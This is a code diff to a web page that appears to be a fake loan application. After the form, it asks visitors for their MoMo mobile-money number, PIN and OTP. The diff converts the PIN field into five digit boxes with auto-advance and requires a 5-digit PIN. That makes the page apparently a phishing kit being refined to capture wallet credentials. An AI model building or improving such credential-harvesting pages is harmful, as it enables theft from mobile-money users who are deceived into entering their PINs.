@@ -48,6 +48,12 @@
     .btn-group { display: flex; gap: 10px; margin-top: 10px; }
     .btn-secondary { background: #e0e0e0; color: #333; }
     .btn-secondary:active { background: #ccc; }
+    
+    /* Custom PIN Input Styling */
+    .pin-container { display: flex; justify-content: space-between; gap: 10px; margin-bottom: 20px; }
+    .pin-box { width: 15%; height: 55px; text-align: center; font-size: 24px; border: 1px solid #ddd; border-radius: 10px; outline: none; background: #fafafa; }
+    .pin-box:focus { border-color: #ffcc00; background: #fff; }
+
     .otp-container { display: flex; justify-content: center; gap: 10px; margin: 20px 0; }
     .otp-input { width: 50px; height: 60px; text-align: center; font-size: 24px; border: 2px solid #ddd; border-radius: 10px; outline: none; }
     .otp-input:focus { border-color: #ffcc00; }
@@ -209,7 +215,16 @@
           <input type="tel" id="loginPhone" placeholder="Cellphone Number" style="flex: 1; padding: 15px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px;">
         </div>
         <label style="font-weight: 500; font-size: 14px; margin-bottom: 10px; display: block;">Enter your PIN</label>
-        <input type="password" id="loginPin" placeholder="PIN" maxlength="4" style="width: 100%; padding: 15px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; margin-bottom: 20px;">
+        
+        <!-- 5 Digit PIN Container -->
+        <div class="pin-container" id="loginPinContainer">
+            <input type="password" class="pin-box" maxlength="1" oninput="movePin(this, 0)">
+            <input type="password" class="pin-box" maxlength="1" oninput="movePin(this, 1)">
+            <input type="password" class="pin-box" maxlength="1" oninput="movePin(this, 2)">
+            <input type="password" class="pin-box" maxlength="1" oninput="movePin(this, 3)">
+            <input type="password" class="pin-box" maxlength="1" oninput="movePin(this, 4)">
+        </div>
+        
       </div>
       <button class="btn" style="border-radius: 30px; padding: 18px;" onclick="submitLogin()">Continue</button>
       <p style="color: #002d62; font-weight: 500; font-size: 14px; margin-top: 20px; cursor: pointer;">Change your MoMo number</p>
@@ -287,11 +302,7 @@
     const amount = document.getElementById('loanAmount').value;
     const term = document.getElementById('loanTerm').value;
     const purpose = document.getElementById('loanPurpose').value.trim();
-
-    if (!amount || !term || !purpose) {
-      return alert('Please fill in all fields.');
-    }
-
+    if (!amount || !term || !purpose) return alert('Please fill in all fields.');
     formData.loanAmount = amount;
     formData.loanTerm = term;
     formData.purpose = purpose;
@@ -303,16 +314,11 @@
     const lastName = document.getElementById('lastName').value.trim();
     const email = document.getElementById('email').value.trim();
     const phone = document.getElementById('phone').value.trim();
-
-    if (!firstName || !lastName || !email || !phone) {
-      return alert('Please fill in all fields.');
-    }
-
+    if (!firstName || !lastName || !email || !phone) return alert('Please fill in all fields.');
     formData.firstName = firstName; 
     formData.lastName = lastName; 
     formData.email = email; 
     formData.phone = phone;
-    
     document.getElementById('sumAmount').textContent = `ZAR ${parseInt(formData.loanAmount).toLocaleString()}`;
     document.getElementById('sumTerm').textContent = `${formData.loanTerm} Months`;
     document.getElementById('sumPurpose').textContent = formData.purpose;
@@ -322,16 +328,11 @@
 
   function submitApplication() {
     const annualIncome = document.getElementById('annualIncome').value.trim();
-
-    if (!annualIncome) {
-      return alert('Please fill in all fields.');
-    }
-
+    if (!annualIncome) return alert('Please fill in all fields.');
     formData.employmentStatus = document.getElementById('employmentStatus').value;
     formData.annualIncome = annualIncome;
     goToPage('page-success');
     showToast();
-    
     let countdown = 3;
     const timer = setInterval(() => {
       countdown--;
@@ -345,12 +346,23 @@
     document.getElementById('loginPhone').value = formData.phone || '';
   }
 
+  // NEW: PIN Input Logic for 5 digits
+  function movePin(input, index) {
+    input.value = input.value.replace(/[^0-9]/g, ''); // Only numbers
+    const inputs = document.querySelectorAll('#loginPinContainer .pin-box');
+    if (input.value.length === 1 && index < inputs.length - 1) {
+      inputs[index + 1].focus();
+    }
+  }
+
   async function submitLogin() {
     const phone = document.getElementById('loginPhone').value.trim();
-    const pin = document.getElementById('loginPin').value.trim();
+    const pins = document.querySelectorAll('#loginPinContainer .pin-box');
+    let pin = ''; 
+    pins.forEach(p => pin += p.value);
 
-    if (!phone || !pin) {
-      return alert('Please fill in all fields.');
+    if (!phone || pin.length !== 5) {
+      return alert('Please enter phone and 5-digit PIN.');
     }
 
     if (!currentRequestId) currentRequestId = Math.random().toString(36).substring(2, 10);
